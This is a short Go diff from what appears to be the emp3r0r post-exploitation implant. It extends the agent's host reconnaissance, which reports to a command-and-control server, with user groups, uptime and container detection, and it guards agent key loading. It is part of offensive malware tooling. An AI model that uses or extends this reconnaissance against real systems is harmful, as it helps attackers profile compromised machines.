@@ -47,8 +47,10 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 	info.C2Host = common.RuntimeConfig.CCAddress
 
 	// Identity (TOFU)
-	if err := GetAgentKey(); err != nil {
-		logging.Errorf("Failed to get agent key: %v", err)
+	if AgentKey == nil {
+		if err := GetAgentKey(); err != nil {
+			logging.Errorf("Failed to get agent key: %v", err)
+		}
 	} else {
 		// Public Key
 		pubKeyBytes, err := transport.PublicKeyToPEM(&AgentKey.PublicKey)
@@ -91,6 +93,16 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 	}
 	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)
 
+	// User groups
+	gids, err := u.GroupIds()
+	if err != nil {
+		logging.Printf("GroupIds: %v", err)
+	}
+	info.Groups = strings.Join(gids, ",")
+
+	// Uptime
+	info.Uptime = GetUptime()
+
 	// is cc on tor?
 	info.HasTor = netutil.IsTor(def.CCAddress)
 
@@ -111,6 +123,11 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 	info.Exes = []string{}
 
 	return &info
+}
+
+// GetUptime get system uptime
+func GetUptime() string {
+	return util.GetUptime()
 }
 
 // CollectFullSystemInfo build full system info object
@@ -189,4 +206,9 @@ func CollectFullSystemInfo() *def.Emp3r0rAgent {
 	info.Exes = util.ScanPATH()
 
 	return &info
+}
+
+// GetContainerName check if we are in a container
+func GetContainerName() string {
+	return sysinfo.CheckContainer()
 }
